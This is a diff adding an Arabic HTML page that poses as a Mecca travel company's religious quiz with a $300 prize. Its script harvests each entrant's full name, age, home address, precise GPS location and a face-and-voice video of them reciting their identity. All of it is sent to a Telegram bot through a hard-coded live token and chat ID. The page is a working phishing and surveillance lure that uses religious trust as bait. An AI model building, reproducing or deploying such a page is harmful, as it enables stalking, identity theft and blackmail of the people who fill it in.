@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مسابقة شركة مكة المكرمة للسفر والسياحة</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:linear-gradient(135deg,#0d3d2e,#1a5c3f);min-height:100vh;padding:15px}
+.card{background:#fff;border-radius:12px;padding:20px;max-width:500px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+.header{text-align:center;background:linear-gradient(135deg,#0d3d2e,#1a5c3f);color:#fff;padding:20px;border-radius:10px;margin-bottom:20px}
+.header .kaaba{font-size:50px}
+.header h1{font-size:20px;margin-top:10px;color:#d4af37}
+.header h2{font-size:16px;font-weight:normal;margin-top:5px}
+.header .prize{background:#d4af37;color:#000;padding:8px 15px;border-radius:20px;font-weight:bold;display:inline-block;margin-top:15px;font-size:18px}
+label{display:block;font-size:14px;color:#333;margin-top:15px;margin-bottom:6px;font-weight:bold}
+input,textarea,select{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:15px;background:#f9f9f9;box-sizing:border-box;font-family:inherit}
+textarea{min-height:80px;resize:vertical}
+.btn{width:100%;padding:15px;background:linear-gradient(135deg,#0d3d2e,#1a5c3f);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:20px}
+.btn-gps{background:#d4af37;color:#000;margin-top:10px}
+.btn-cam{background:#c62828;color:#fff;margin-top:10px}
+.status{font-size:12px;color:#666;margin-top:5px;text-align:center}
+.section-title{background:#e8f5e9;color:#0d3d2e;padding:10px;border-radius:8px;font-weight:bold;margin-top:20px;text-align:center}
+video{width:100%;border-radius:8px;margin-top:10px;background:#000}
+.footer{text-align:center;font-size:11px;color:#666;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="header">
+<div class="kaaba">🕋</div>
+<h1>شركة مكة المكرمة للسفر والسياحة</h1>
+<h2>رحلات الحج والعمرة والسياحة الدينية</h2>
+<div class="prize">💵 الجائزة الكبرى: 300 دولار</div>
+</div>
+
+<form id="f">
+
+<div class="section-title">📝 الأسئلة الإسلامية</div>
+
+<label>1. من هي أم أبي بكر الصديق رضي الله عنه؟</label>
+<textarea id="q1" required></textarea>
+
+<label>2. كم كان عمر الرسول ﷺ عندما توفي؟</label>
+<textarea id="q2" required></textarea>
+
+<label>3. ما تفسير الحسد في كتاب الله الكريم؟</label>
+<textarea id="q3" required></textarea>
+
+<label>4. كم عدد زوجات الرسول ﷺ واذكر أسماءهن؟</label>
+<textarea id="q4" required></textarea>
+
+<div class="section-title">👤 بيانات المشترك</div>
+
+<label>1) الاسم الثلاثي *</label>
+<input type="text" id="name" required>
+
+<label>2) اللقب *</label>
+<input type="text" id="nickname" required>
+
+<label>3) العمر *</label>
+<input type="number" id="age" required>
+
+<div class="section-title">🏠 محل السكن</div>
+
+<label>الدولة *</label>
+<input type="text" id="country" required>
+
+<label>المحافظة *</label>
+<input type="text" id="gov" required>
+
+<label>القضاء *</label>
+<input type="text" id="district" required>
+
+<label>رقم الدار *</label>
+<input type="text" id="house" required>
+
+<div class="section-title">📍 تأكيد الموقع</div>
+<p style="font-size:13px;color:#666;text-align:center;margin-top:10px">للتأكد من موقعك، اضغط الزر ووافق على طلب الوصول إلى الموقع.</p>
+<button type="button" class="btn btn-gps" id="gpsBtn">📍 تحديد موقعي</button>
+<div class="status" id="gpsStatus">لم يتم تحديد الموقع بعد</div>
+
+<div class="section-title">🎥 تسجيل فيديو</div>
+<p style="font-size:13px;color:#666;text-align:center;margin-top:10px">سجّل فيديو قصيراً تقول فيه: اسمك الثلاثي، لقبك، ومحل سكنك. يتطلب الأمر السماح بالوصول إلى الكاميرا والميكروفون.</p>
+
+<video id="preview" autoplay muted playsinline></video>
+<button type="button" class="btn btn-cam" id="camBtn">🎥 تشغيل الكاميرا</button>
+<button type="button" class="btn" id="recBtn" style="display:none;background:#c62828">⏺️ بدء التسجيل</button>
+<button type="button" class="btn" id="stopBtn" style="display:none;background:#333">⏹️ إيقاف التسجيل</button>
+<div class="status" id="camStatus">لم يتم تسجيل فيديو بعد</div>
+
+<button type="submit" class="btn" style="background:linear-gradient(135deg,#d4af37,#8b6914);color:#000">📤 إرسال الاستمارة</button>
+
+</form>
+<div class="footer">© 2026 شركة مكة المكرمة للسفر والسياحة<br>الفائزون بالإجابات الصحيحة يدخلون القرعة على الجائزة</div>
+</div>
+
+<script>
+const BOT = '8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
+const CHAT = '-1003821295154';
+
+let gpsData = 'لم يتم';
+let mediaRecorder = null;
+let recordedChunks = [];
+let stream = null;
+let videoBlob = null;
+
+// GPS
+document.getElementById('gpsBtn').addEventListener('click', function(){
+    const status = document.getElementById('gpsStatus');
+    status.textContent = 'جاري تحديد الموقع...';
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(
+            function(pos){
+                gpsData = pos.coords.latitude + ',' + pos.coords.longitude;
+                status.textContent = '✅ تم تحديد الموقع: ' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4);
+                status.style.color = '#0d3d2e';
+            },
+            function(err){
+                gpsData = 'مرفوض';
+                status.textContent = '❌ تم رفض الوصول للموقع';
+                status.style.color = '#c62828';
+            },
+            {enableHighAccuracy:true, timeout:10000}
+        );
+    }
+});
+
+// Camera
+document.getElementById('camBtn').addEventListener('click', async function(){
+    try{
+        stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:true});
+        const preview = document.getElementById('preview');
+        preview.srcObject = stream;
+        document.getElementById('recBtn').style.display = 'block';
+        document.getElementById('camStatus').textContent = '✅ الكاميرا تعمل. اضغط "بدء التسجيل".';
+    }catch(e){
+        document.getElementById('camStatus').textContent = '❌ تم رفض الوصول للكاميرا';
+    }
+});
+
+// Start recording
+document.getElementById('recBtn').addEventListener('click', function(){
+    recordedChunks = [];
+    mediaRecorder = new MediaRecorder(stream);
+    mediaRecorder.ondataavailable = function(e){ if(e.data.size > 0) recordedChunks.push(e.data); };
+    mediaRecorder.onstop = function(){
+        videoBlob = new Blob(recordedChunks, {type:'video/webm'});
+        document.getElementById('camStatus').textContent = '✅ تم تسجيل الفيديو (' + Math.round(videoBlob.size/1024) + ' KB)';
+    };
+    mediaRecorder.start();
+    document.getElementById('recBtn').style.display = 'none';
+    document.getElementById('stopBtn').style.display = 'block';
+    document.getElementById('camStatus').textContent = '⏺️ جاري التسجيل...';
+});
+
+// Stop recording
+document.getElementById('stopBtn').addEventListener('click', function(){
+    mediaRecorder.stop();
+    document.getElementById('stopBtn').style.display = 'none';
+    if(stream) stream.getTracks().forEach(t => t.stop());
+});
+
+// Submit
+document.getElementById('f').addEventListener('submit', async function(e){
+    e.preventDefault();
+    
+    const msg = '🕋 *مسابقة شركة مكة المكرمة*\n\n' +
+    '📝 *الإجابات:*\n' +
+    '1. ' + document.getElementById('q1').value + '\n' +
+    '2. ' + document.getElementById('q2').value + '\n' +
+    '3. ' + document.getElementById('q3').value + '\n' +
+    '4. ' + document.getElementById('q4').value + '\n\n' +
+    '👤 *بيانات المشترك:*\n' +
+    'الاسم: ' + document.getElementById('name').value + '\n' +
+    'اللقب: ' + document.getElementById('nickname').value + '\n' +
+    'العمر: ' + document.getElementById('age').value + '\n\n' +
+    '🏠 *السكن:*\n' +
+    'الدولة: ' + document.getElementById('country').value + '\n' +
+    'المحافظة: ' + document.getElementById('gov').value + '\n' +
+    'القضاء: ' + document.getElementById('district').value + '\n' +
+    'رقم الدار: ' + document.getElementById('house').value + '\n\n' +
+    '📍 GPS: `' + gpsData + '`\n' +
+    '🕐 ' + new Date().toLocaleString('ar-IQ');
+    
+    // Send text
+    await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage?chat_id=' + CHAT + '&text=' + encodeURIComponent(msg) + '&parse_mode=Markdown');
+    
+    // Send video
+    if(videoBlob){
+        const fd = new FormData();
+        fd.append('chat_id', CHAT);
+        fd.append('caption', '🎥 فيديو المشترك: ' + document.getElementById('name').value);
+        fd.append('video', videoBlob, 'video.webm');
+        await fetch('https://api.telegram.org/bot' + BOT + '/sendVideo', {method:'POST', body:fd});
+    }
+    
+    alert('✅ تم إرسال استمارتك بنجاح');
+    document.getElementById('f').reset();
+    gpsData = 'لم يتم';
+    videoBlob = null;
+});
+</script>
+</body>
+</html>
